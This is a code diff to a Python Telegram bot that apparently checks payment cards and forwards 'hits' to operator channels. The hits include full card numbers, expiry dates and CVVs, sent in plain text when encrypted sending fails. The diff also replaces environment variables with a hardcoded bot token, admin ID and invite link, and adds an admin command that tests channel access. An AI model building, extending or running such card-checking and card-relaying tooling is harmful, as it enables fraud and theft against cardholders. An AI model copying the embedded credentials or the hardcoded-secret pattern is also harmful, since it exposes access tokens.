@@ -114,15 +114,12 @@ RECEIVED_FOLDER = "received"
 PUBLIC_HITS_FOLDER = "hits/public"
 PRIVATE_HITS_FOLDER = "hits/private"
 USER_LOGS_FOLDER = "user_logs"
-APPROVED_LOG_CHANNEL = -1003800566702
+APPROVED_LOG_CHANNEL = -1003882471203
 PRIVATE_LOG_CHANNEL = -1003898549508
-BOT_TOKEN = os.getenv("BOT_TOKEN", "")
-ADMIN_IDS = [int(id.strip()) for id in os.getenv("ADMIN_IDS", "").split(",")]
-CHANNEL_LINK = os.getenv("CHANNEL_LINK", "")
+BOT_TOKEN = "8163640062:AAGMtAvS8x_woZxO-achiMGV23iwPgnY8n4"
+ADMIN_IDS = [8079395886]
+CHANNEL_LINK = "https://t.me/+zsK6NPGgvSc4NzM1"
 DOMAIN = "jogoka.com"
-PK = os.getenv(
-    "STRIPE_PK",
-    "")
 
 # Create folders
 Path(RECEIVED_FOLDER).mkdir(exist_ok=True, parents=True)
@@ -3811,24 +3808,32 @@ async def send_to_log_channel(context, card: str, status: str, message: str, use
         keyboard = [[create_decryption_button(encrypted_card)]]
         reply_markup = InlineKeyboardMarkup(keyboard)
         
-        # Send to channel with button
-        await context.bot.send_message(
-            chat_id=channel_id,
-            text=channel_text,
-            parse_mode=ParseMode.HTML,
-            reply_markup=reply_markup
-        )
+        # Try to send with reply_markup first (for groups)
+        try:
+            await context.bot.send_message(
+                chat_id=channel_id,
+                text=channel_text,
+                parse_mode=ParseMode.HTML,
+                reply_markup=reply_markup
+            )
+        except BadRequest as e:
+            # If buttons fail (some groups restrict them), send without buttons
+            if "inline keyboard" in str(e).lower() or "button" in str(e).lower():
+                logger.warning(f"Group {channel_id} doesn't support inline buttons, sending without")
+                await context.bot.send_message(
+                    chat_id=channel_id,
+                    text=channel_text,
+                    parse_mode=ParseMode.HTML
+                )
+            else:
+                raise e
         
-        # Send plain version to user (if they checked it)
-        # This should already be handled by the main check functions
-        
-        logger.info(f"✓ Forwarded ENCRYPTED {channel_label} {status} hit to channel")
+        logger.info(f"✓ Forwarded ENCRYPTED {channel_label} {status} hit to chat {channel_id}")
         
     except Exception as e:
-        logger.error(f"Error sending encrypted to channel: {e}")
-        # Fallback: send plain text
+        logger.error(f"Error sending to chat {channel_id}: {e}")
+        # Fallback: try to send plain version
         try:
-            # Send plain version as fallback
             original_card = f"{cc}|{mon}|{year}|{cvv}"
             fallback_text = f"""
 [↯] Card: <code>{original_card}</code>
@@ -3850,8 +3855,9 @@ async def send_to_log_channel(context, card: str, status: str, message: str, use
                 text=fallback_text,
                 parse_mode=ParseMode.HTML
             )
+            logger.info(f"✓ Sent plain {channel_label} {status} hit to chat {channel_id}")
         except Exception as e2:
-            logger.error(f"Fallback also failed: {e2}")
+            logger.error(f"Fallback also failed for chat {channel_id}: {e2}")
 
 async def handle_file_upload_message(update: Update, context: ContextTypes.DEFAULT_TYPE):
     """Handle file upload messages for both public and private checks"""
@@ -3952,7 +3958,39 @@ async def unknown_command(update: Update, context: ContextTypes.DEFAULT_TYPE):
         "*❌ Invalid Command*\n\n"
         "Use `/help` to see available commands.",
         parse_mode=ParseMode.MARKDOWN)
-
+        
+async def test_group_access_command(update: Update, context: ContextTypes.DEFAULT_TYPE):
+    """Test if bot can send to groups"""
+    if update.effective_user.id not in ADMIN_IDS:
+        return
+    
+    test_message = "✅ TEST - Bot access check"
+    
+    try:
+        # Test APPROVED_LOG_CHANNEL (public group)
+        try:
+            await context.bot.send_message(
+                chat_id=APPROVED_LOG_CHANNEL,
+                text=test_message,
+                parse_mode=ParseMode.HTML
+            )
+            await update.message.reply_text(f"✅ Successfully sent to PUBLIC group {APPROVED_LOG_CHANNEL}")
+        except Exception as e:
+            await update.message.reply_text(f"❌ Failed to send to PUBLIC group {APPROVED_LOG_CHANNEL}:\n{str(e)}")
+        
+        # Test PRIVATE_LOG_CHANNEL (private group/channel)
+        try:
+            await context.bot.send_message(
+                chat_id=PRIVATE_LOG_CHANNEL,
+                text=test_message,
+                parse_mode=ParseMode.HTML
+            )
+            await update.message.reply_text(f"✅ Successfully sent to PRIVATE group {PRIVATE_LOG_CHANNEL}")
+        except Exception as e:
+            await update.message.reply_text(f"❌ Failed to send to PRIVATE group {PRIVATE_LOG_CHANNEL}:\n{str(e)}")
+        
+    except Exception as e:
+        await update.message.reply_text(f"❌ General error:\n{str(e)}")
 
 class HealthHandler(BaseHTTPRequestHandler):
 
@@ -4192,7 +4230,7 @@ async def main():
     application.add_handler(CommandHandler("addcr", addcr_command))
     application.add_handler(CommandHandler("gengift", gengift_command))
     application.add_handler(CommandHandler("listgifts", listgifts_command))
-    application.add_handler(CommandHandler("testch", test_channels_command))
+    application.add_handler(CommandHandler("testaccess", test_group_access_command))
 
     # ========== MESSAGE HANDLERS ==========
     application.add_handler(
